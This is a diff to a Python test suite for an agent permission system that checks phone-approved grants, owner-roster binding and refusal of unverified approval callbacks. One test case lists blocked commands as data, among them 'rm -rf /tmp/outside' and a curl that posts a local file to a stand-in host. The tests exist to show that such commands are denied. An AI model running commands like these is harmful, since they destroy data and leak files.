@@ -383,7 +383,11 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
         self.sent=[];self.h=_host(self.st,self.sent)
         self.phone=Phone(self.st,'Origin',with_passkey=True);self.phone.auth._test_approval_key=self.phone.sk;self.phone.auth._test_device=self.phone.did;self.s=_ready(self.h,self.phone);self.s.p33=True
         self.other=Phone(self.st,'Other',with_passkey=True);self.other.auth._test_approval_key=self.other.sk;self.other.auth._test_device=self.other.did;self.other_s=_ready(self.h,self.other,cid=12);self.other_s.p33=True
-        self.send=Send(self.phone.did,'origin-task',17,source=provenance.phone())
+        # Real held owner origin: a synthetic Send id alone is not verified phone provenance.
+        from agentj import approval_review
+        turn=self.h.hist_add({'k':'phone','dev':self.phone.did,'name':'Origin','text':'Synthetic owner grant task'},'', 'done')
+        self.send=Send(self.phone.did,'origin-task',turn['id'],source=provenance.phone())
+        self.send.approval_origin=approval_review.remember(self.h,turn,provenance.phone())
         self.h.agent=SimpleNamespace(kind='codex',status='idle',cur_send=self.send,phone_turn=True,pending_source=provenance.phone())
         self.h.agent_cfg={'dir':self.tmp.name,'kind':'codex'}
         self.svc=peer_service.PeerService(self.h);self.svc.keys=SimpleNamespace(id='A');self.h.peers=self.svc
@@ -452,6 +456,36 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
         await self.svc.xfer.bind_phone(self.s,{'t':'roster_bind','fa':fa,'roster_sig':bogus_sig})
         self.assertFalse(self.sent[-1][1]['ok'])
 
+    async def test_binding_preserves_all_active_and_pending_relationship_snapshots(self):
+        from agentj.same_owner import SameOwner
+        from test_p71_peer_service import peer_keys
+        self.svc.keys = peer_keys()
+        self.svc.same_owner = SameOwner(self.svc)
+        friends = [peer_keys() for _ in range(7)]
+        for friend in friends:
+            self.svc.store.add_friend(friend.id, wire.b64u(friend.x_pub), wire.b64u(friend.ed_pub), friend.mbox)
+        with self.svc.store._edit('same-owner.json', {}) as rows:
+            for friend in friends:
+                rows[friend.id] = {'nonce': '1' * 32, 'pub': wire.b64u(self.phone.sk.public_key().public_bytes_raw()),
+                                  'remote_nonce': '2' * 32, 'remote_pub': wire.b64u(friend.ed_pub),
+                                  'remote': '3' * 32, 'token': '4' * 32, 'echo': '4' * 32,
+                                  'expires': self.svc.clock() + 86400, 'seq': 7}
+        with self.svc.store._edit('same-owner.json', {}) as rows:
+            for friend in friends:
+                rows[friend.id]['verified'] = self.svc.same_owner.challenge(friend.id)
+            rows[friends[-1].id].update(token='', remote='', echo='', verified=None)
+        self.assertTrue(all(self.svc.same_owner.active(f.id) for f in friends[:-1]))
+        before = copy.deepcopy(self.svc.store._read('same-owner.json', {}))
+        e = self.svc.xfer.binding_entry(self.phone.did)
+        fa = self.phone.auth.assert_(og.bind_challenge(e), b'', nonce=b'')
+        sig = wire.b64u(self.phone.sk.sign(b'agentj-owner-roster-v1\n' + og.jcs({k:e[k] for k in ('id','alg','spki','rp','dev')})))
+        await self.svc.xfer.bind_phone(self.s, {'t':'roster_bind','fa':fa,'roster_sig':sig})
+        self.assertTrue(self.sent[-1][1]['ok'])
+        self.assertEqual(self.svc.store._read('same-owner.json', {}), before)
+        self.assertTrue(all(self.svc.same_owner.active(f.id) for f in friends[:-1]))
+        self.assertTrue(self.svc.xfer.bound(self.phone.did))
+        self.assertEqual(self.svc.store._read('owner-roster.json', {})['B']['list'], [entry(self.phone.auth,self.phone.did)])
+
     async def test_cli_parser_plan_and_ask_give(self):
         import argparse
         from agentj import elevate
@@ -516,7 +550,16 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
 
 
     async def test_ud_socket_cli_grant_and_list(self):
+        await self._ud_socket_cli_grant_and_list(host_bound_origin=True)
+
+    async def test_ud_callback_without_host_origin_stays_refused(self):
+        await self._ud_socket_cli_grant_and_list(host_bound_origin=False)
+
+    async def _ud_socket_cli_grant_and_list(self, *, host_bound_origin):
         import sys
+        from contextlib import nullcontext
+        from agentj import approval_review
+        children=[]
         self.plan_file=pathlib.Path(self.tmp.name)/'grant.json'
         self.plan_file.write_text(json.dumps({'title':'CLI task','why':'Delete obsolete build','steps':[{'host':'B','cat':'delete','what':'Clean build','paths':['/tmp/p574-cli-build'],'max':1}]}))
         self.h.agent.proc = SimpleNamespace(pid=os.getpid())
@@ -532,11 +575,16 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
             self.assertEqual((await self.svc.xfer.broker.execute('Bash',native,'cli-grant'))['behavior'],'allow')
             proc=await asyncio.create_subprocess_exec(sys.executable,'-m','agentj.cli','secret','grant','--file',str(self.plan_file),'--json',
                                                       stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,env=env,cwd=self.tmp.name)
+            children.append(proc)
             out,err=await asyncio.wait_for(proc.communicate(),5)
             self.assertEqual(proc.returncode,0,err.decode())
             self.assertEqual(json.loads(out)['result'],'pending')
             self.assertFalse(self.h.asks, 'a native permission decision alone cannot cause a transfer or UV card')
-            self.svc.xfer.broker.complete('cli-grant',True,out.decode())
+            # Native completion is delivered with the bridge's captured Host-held origin.
+            # The callback task must not borrow whatever owner turn happens to be current later.
+            bound = approval_review.origin_scope(self.send.approval_origin) if host_bound_origin else nullcontext()
+            with bound:
+                self.svc.xfer.broker.complete('cli-grant',True,out.decode())
             for _ in range(400):
                 if self.h.asks:break
                 await asyncio.sleep(.005)
@@ -545,18 +593,35 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
                 self.fail(f'No CLI card: exit={proc.returncode}, stdout={out.decode()}, stderr={err.decode()}')
             ask=next(iter(self.h.asks.values()))
             await self.h._answer(self.s,self.phone.answer(self.h._ask_msg(ask,self.s),True))
+            if not host_bound_origin:
+                self.assertFalse(ask.fut.done(),'unbound callback cannot use the current owner origin')
+                self.assertFalse(ask.envelope['source']['verified'])
+                self.assertIn('unverified_trigger',[m.get('why') for _,m in self.sent if m.get('t')=='answer_refused'])
+                return
+            self.assertTrue(ask.fut.done(),json.dumps({'refusals':[m.get('why') for _,m in self.sent if m.get('t')=='answer_refused'],
+                'source':{k:ask.envelope['source'].get(k) for k in ('channel','verified','suspicious','message_id','root_message_id','session')}}))
             out,err=await asyncio.wait_for(proc.communicate(),5)
             self.assertEqual(proc.returncode,0,err.decode())
-            await self.svc.xfer.broker.drain()
+            await asyncio.wait_for(self.svc.xfer.broker.drain(),2)
             res=self.svc.xfer.broker.receipt({'t':'sx','op':'grant','cwd':self.tmp.name,'plan':json.loads(self.plan_file.read_text())})
             self.assertEqual(res['result'],'signed')
             listed=await asyncio.create_subprocess_exec(sys.executable,'-m','agentj.cli','secret','grants','--json',
                                                       stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,env=env,cwd=self.tmp.name)
+            children.append(listed)
             out,err=await asyncio.wait_for(listed.communicate(),5)
             self.assertEqual(listed.returncode,0,err.decode())
             self.assertEqual(json.loads(out)['items'][0]['grant'],res['grant'])
         finally:
-            await self.h.elevate.stop()
+            jobs=list(self.svc.xfer.broker.jobs)
+            for job in jobs:job.cancel()
+            if jobs:await asyncio.gather(*jobs,return_exceptions=True)
+            for child in children:
+                if child.returncode is None:
+                    child.terminate()
+                    try:await asyncio.wait_for(child.wait(),2)
+                    except asyncio.TimeoutError:
+                        child.kill();await child.wait()
+            await asyncio.wait_for(self.h.elevate.stop(),2)
 
     async def test_specific_host_recovery_survives_restart_but_not_unrelated_system(self):
         from agentj.capability import ReadBackSend
@@ -726,6 +791,11 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(res['why'],'shape');self.assertFalse(sent);self.assertFalse(self.h.asks)
 
     async def test_origin_local_four_steps_use_same_signature_and_respect_task_source_and_counts(self):
+        recovery=self.h.background_done.recovery
+        self.assertEqual(recovery.path,self.st.root/'busy'/'recovery.json')
+        # This exercises authorization, not diagnostic fsync latency under the qualify disk load.
+        # Keep the real refusal/record logic; isolate only its persistence side effect.
+        recovery_save=self.enterContext(patch.object(recovery,'save'))
         cases=[('delete',{'paths':['/tmp/p574-local-delete']},'rm -rf /tmp/p574-local-delete/old','rm -rf /tmp/outside'),
                ('send',{'prefix':['git','push']},'git push origin main','curl -d @/tmp/file https://unapproved.example'),
                ('spend',{'exact':'stripe charges create --amount 100 --currency usd'},'stripe charges create --amount 100 --currency usd','stripe charges create --amount 1000000 --currency usd'),
@@ -735,8 +805,8 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
         signed=await self.sign_plan({'title':'One local and remote task','why':'Perform these exact release steps','steps':steps})
         self.assertEqual(signed['result'],'signed')
         async def denied(command):
-            res=await asyncio.wait_for(self.h.ask('Bash',{'command':command},ttl=.03),.5)
-            self.assertNotEqual(res['behavior'],'allow')
+            res=await asyncio.wait_for(self.h.ask('Bash',{'command':command},ttl=.03),2)
+            self.assertEqual(res['behavior'],'deny')
         for cat,_,allowed,blocked in cases:
             res=await asyncio.wait_for(self.h.ask('Bash',{'command':allowed}),1)
             self.assertEqual(res['behavior'],'allow',cat);self.assertFalse(self.h.asks)
@@ -749,6 +819,8 @@ class HostFlows(unittest.IsolatedAsyncioTestCase):
             await denied(allowed)
         rec=self.svc.xfer._grants_out()[signed['grant']]
         self.assertEqual(rec['used'],{str(i):2 for i in range(4)})
+        self.assertTrue(any(row.get('original_error')=='group_source' for row in recovery.rows.values()))
+        self.assertGreater(recovery_save.call_count,0,'real refusal still records its diagnostic')
 
     async def test_revoked_roster_credential_cannot_return_from_old_valid_list(self):
         root=self.bound_entry(self.phone)
